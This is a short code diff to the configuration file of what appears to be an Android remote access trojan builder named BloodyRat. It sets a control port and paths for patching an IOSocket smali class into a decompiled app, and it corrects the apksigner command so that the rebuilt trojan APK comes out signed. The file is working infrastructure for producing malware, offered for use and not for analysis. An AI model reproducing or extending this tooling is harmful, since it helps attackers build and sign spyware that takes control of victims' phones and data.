@@ -7,6 +7,7 @@ exports.control_port = 22222;
 
 // Paths
 exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
+exports.apkBuildSign = path.join(__dirname, '../assets/webpublic/build.s.apk')
 exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/BloodyRat.apk')
 
 exports.downloadsFolder = '/client_downloads'
@@ -21,8 +22,9 @@ exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
 exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/justhack/hackapk/IOSocket.smali');
 
 exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
-// exports.signCommand = 'java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '"'; // <-- fix output
-exports.signCommand = 'java -jar "' + exports.apkSign + '" ' + exports.testkey509 + '" ' + exports.testkeypk8 + '" ' + exports.apkBuildPath + '" ' + '"';
+//exports.signCommand = 'java -jar "' + exports.apkSign + '" ' + exports.testkey509 + '" ' + exports.testkeypk8 + '" ' + exports.apkBuildPath + '" ' + '"';
+exports.signCommand = 'java -jar "' + exports.apkSign + '" ' + exports.testkey509 + ' ' + exports.testkeypk8 + ' ' + exports.apkBuildPath + ' ' + exports.apkBuildSign;
+
 
 
 exports.messageKeys = {
